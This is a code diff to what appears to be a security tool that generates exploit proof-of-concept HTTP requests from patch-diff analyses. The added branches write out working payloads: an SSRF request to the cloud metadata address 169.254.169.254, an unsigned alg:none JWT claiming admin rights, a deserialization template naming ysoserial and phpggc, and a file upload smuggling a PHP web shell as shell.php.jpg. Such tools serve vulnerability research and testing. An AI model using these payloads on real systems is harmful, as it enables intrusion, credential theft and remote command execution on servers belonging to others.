@@ -840,6 +840,64 @@ def generate_poc_from_analysis(analysis: "PatchDiffAnalysis",
         lines.append("")
         lines.append("# Expected: response contains '49' (7*7 evaluated)")
 
+    elif analysis.fix_class == "ssrf" and param:
+        _ssrf_payload = payload or "http://169.254.169.254/latest/meta-data/"
+        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
+        if http_method.upper() == "GET":
+            lines.append(f"GET {endpoint}?{param}={_ssrf_payload} HTTP/1.1")
+        else:
+            lines.append(f"POST {endpoint} HTTP/1.1")
+            lines.append(f"Host: {_host}")
+            lines.append("Content-Type: application/json")
+            if auth_header:
+                lines.append(f"Authorization: {auth_header}")
+            lines.append("")
+            lines.append('{"' + param + '": "' + _ssrf_payload + '"}')
+            lines.append("")
+            lines.append("# Expected: response contains AWS metadata or internal IP response")
+            return "\n".join(lines)
+        lines.append(f"Host: {_host}")
+        lines.append("")
+        lines.append("# Expected: response contains AWS metadata or internal IP response")
+
+    elif analysis.fix_class == "jwt_bypass":
+        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
+        lines.append("# Craft a JWT with alg:none or alg:HS256 signed with public key")
+        lines.append(f"GET {endpoint} HTTP/1.1")
+        lines.append(f"Host: {_host}")
+        _alg_none_jwt = ("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0"
+                         ".eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.")
+        lines.append(f"Authorization: Bearer {_alg_none_jwt}")
+        lines.append("")
+        lines.append("# Expected: 200 OK with admin-level response (alg:none bypass)")
+
+    elif analysis.fix_class in ("insecure_deserialization", "deserialization"):
+        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
+        lines.append("# Gadget chain payload required (depends on target framework)")
+        lines.append(f"POST {endpoint} HTTP/1.1")
+        lines.append(f"Host: {_host}")
+        lines.append("Content-Type: application/x-java-serialized-object")
+        lines.append("")
+        lines.append("# [insert ysoserial/phpggc gadget chain payload here]")
+        lines.append("# Tool: ysoserial (Java), phpggc (PHP), or pickle-payload (Python)")
+
+    elif analysis.fix_class == "file_upload_bypass":
+        lines.append(f"# PoC: {analysis.fix_class} — {analysis.vuln_pattern}")
+        lines.append(f"POST {endpoint} HTTP/1.1")
+        lines.append(f"Host: {_host}")
+        lines.append("Content-Type: multipart/form-data; boundary=----WebKitFormBoundary")
+        if auth_header:
+            lines.append(f"Authorization: {auth_header}")
+        lines.append("")
+        lines.append("------WebKitFormBoundary")
+        lines.append('Content-Disposition: form-data; name="file"; filename="shell.php.jpg"')
+        lines.append("Content-Type: image/jpeg")
+        lines.append("")
+        lines.append("<?php system($_GET['cmd']); ?>")
+        lines.append("------WebKitFormBoundary--")
+        lines.append("")
+        lines.append("# Expected: file uploaded, accessible as /uploads/shell.php.jpg")
+
     else:
         # Generic PoC hint
         if param and payload:
